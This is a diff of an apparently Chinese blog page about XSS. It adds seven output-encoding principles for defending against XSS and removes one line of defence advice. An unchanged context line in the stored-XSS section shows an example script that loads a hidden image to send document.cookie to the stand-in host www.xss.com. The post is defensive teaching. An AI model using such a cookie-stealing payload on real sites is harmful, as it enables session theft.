@@ -234,7 +234,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web安全漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">web安全漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反射型XSS"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">反射型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#存储型XSS"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">存储型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DOM-Based-XSS"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">DOM Based XSS</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web安全漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">web安全漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反射型XSS"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">反射型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#存储型XSS"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">存储型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DOM-Based-XSS"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">DOM Based XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码"><span class="post-toc-number">1.0.5.</span> <span class="post-toc-text">2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"><span class="post-toc-number">1.0.6.</span> <span class="post-toc-text">3. 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码方式："><span class="post-toc-number">1.0.6.1.</span> <span class="post-toc-text">编码方式：</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"><span class="post-toc-number">1.0.7.</span> <span class="post-toc-text">4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码格式："><span class="post-toc-number">1.0.7.1.</span> <span class="post-toc-text">编码格式：</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"><span class="post-toc-number">1.0.8.</span> <span class="post-toc-text">5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码方式：同原则4"><span class="post-toc-number">1.0.8.1.</span> <span class="post-toc-text">编码方式：同原则4</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码"><span class="post-toc-number">1.0.9.</span> <span class="post-toc-text">6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-使用富文本时，使用XSS规则引擎进行编码过滤"><span class="post-toc-number">1.0.10.</span> <span class="post-toc-text">7. 使用富文本时，使用XSS规则引擎进行编码过滤</span></a></li></ol></li></ol></li></ol>
 
         <!--
         <li class="mdl-menu__item">
@@ -404,7 +404,6 @@
 </li>
 </ol>
 </blockquote>
-<p>防御方法：对从URL或者用户输入中获取的信息进行字符校验，当检测到JavaScript关键字，html标签符号时对其进行移除或者转义。</p>
 <p>第二种类型:</p>
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
 <p>存储型XSS会把用户输入的数据”存储”在服务器端。这种XSS具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。<strong>黑客把恶意的脚本保存到服务器端</strong>，所以这种XSS攻击就叫做”存储型XSS”<br><em>例子</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//文章中加入下列字段，由于图片是不可视的所以用户完全不会有任何感觉</div><div class="line">var img = document.createElement(&apos;img&apos;);</div><div class="line">img.src=&apos;http://www.xss.com?cookie=&apos;+document.cookie;</div><div class="line">img.style.display=&apos;none&apos;;</div><div class="line">document.getElementsByTagName(&apos;body&apos;)[0].appendChild(img);</div></pre></td></tr></table></figure></p>
@@ -423,6 +422,62 @@
 <blockquote>
 <p>HTTPS提供了端到端的安全加密不仅提供数据机密性（加密），还提供数据完整性（不篡改数据）保护、防重放（把捕获的报文再发一次无效），这样坏小子就很难下手，没有session key 很难去偷窥并篡改用户的数据，更无法依赖HTTPS这个载体植入木马。一定有同学会有疑问，为何明文传输的HTTP可以被劫持，篡改网页内容，而加密传输的HTTPS却不可以？那是因为HTTP被劫持篡改页面，重新计算TCP checksum，用户电脑是无法判别是否被篡改，只好被动接收。而加密传输之后，有了HMAC保护，任何篡改页面的尝试，由于没有session key，无法计算出和篡改网页一致的HMAC，所以数据接收端的SSL/TLS会轻易地识别出网页已被篡改，然后丢弃，既然无法劫持，也就没有篡改的冲动了，所以HTTPS可以很好地对付网页劫持。<br>作者：车小胖<br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
 </blockquote>
+<p>防御XSS方法：主要需要以下七条原则：</p>
+<p><em>下列防御方法参考<a href="http://www.oschina.net/news/43919/7-principles-of-defense-xss" target="_blank" rel="external">防御 XSS 的七条原则</a></em></p>
+<h3 id="1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"><a href="#1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码" class="headerlink" title="1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"></a>1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</h3><h3 id="2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码"><a href="#2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码" class="headerlink" title="2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码"></a>2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</h3><blockquote>
+<p>在这里相当强调是往HTML标签之间插入不可信数据，以区别于往HTML标签属性部分插入不可信数据，因为这两者需要进行不同类型的编码。<br>对<strong>标签之间</strong>插入不可信数据时转码规则是下列：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th style="text-align:center">编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&amp;</td>
+<td style="text-align:center">\&amp;</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td style="text-align:center">\&lt;</td>
+<td></td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td style="text-align:center">\&gt;</td>
+</tr>
+<tr>
+<td>”</td>
+<td style="text-align:center">\&quot;</td>
+</tr>
+<tr>
+<td>‘</td>
+<td style="text-align:center">\&#x27;</td>
+</tr>
+<tr>
+<td>/</td>
+<td style="text-align:center">\&#x2f;</td>
+</tr>
+</tbody>
+</table>
+<p><em>注意</em>：可以使用OWASP提供的<a href="https://www.owasp.org/index.php/ESAPI" target="_blank" rel="external">ESAPI</a>函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。</p>
+<h3 id="3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"><a href="#3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码" class="headerlink" title="3. 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"></a>3. 在将不可信数据插入到<strong>HTML属性</strong>里时，对这些数据进行HTML属性编码</h3><h4 id="编码方式："><a href="#编码方式：" class="headerlink" title="编码方式："></a>编码方式：</h4><blockquote>
+<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）<br><em>在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符 进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击</em></p>
+</blockquote>
+<h3 id="4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"><a href="#4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码" class="headerlink" title="4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"></a>4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</h3><p>这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。  </p>
+<h4 id="编码格式："><a href="#编码格式：" class="headerlink" title="编码格式："></a>编码格式：</h4><p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）</p>
+<h3 id="5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"><a href="#5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码" class="headerlink" title="5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"></a>5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</h3><p>由于css其实不单只能够影响页面布局和样式，其实其一样可以执行脚本，如url，老旧的expressionAPI等，从而对网页进行攻击。</p>
+<h4 id="编码方式：同原则4"><a href="#编码方式：同原则4" class="headerlink" title="编码方式：同原则4"></a>编码方式：同原则4</h4><blockquote>
+<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）</p>
+</blockquote>
+<h3 id="6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码"><a href="#6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码" class="headerlink" title="6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码"></a>6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</h3><p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）</p>
+<p>在对URL进行编码的时候，有两点是需要特别注意的：</p>
+<p>1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码</p>
+<p>2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>
+<h3 id="7-使用富文本时，使用XSS规则引擎进行编码过滤"><a href="#7-使用富文本时，使用XSS规则引擎进行编码过滤" class="headerlink" title="7. 使用富文本时，使用XSS规则引擎进行编码过滤"></a>7. 使用富文本时，使用XSS规则引擎进行编码过滤</h3><p>Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是 JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本， 这样对用户体验伤害很大。</p>
+<p>针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如\<b\>, \<i\>, \<p\>等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在\<div\>, \<p\>等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到\<script\> 标签里。</script\></p\></div\></p\></i\></b\></p>
 
     
 
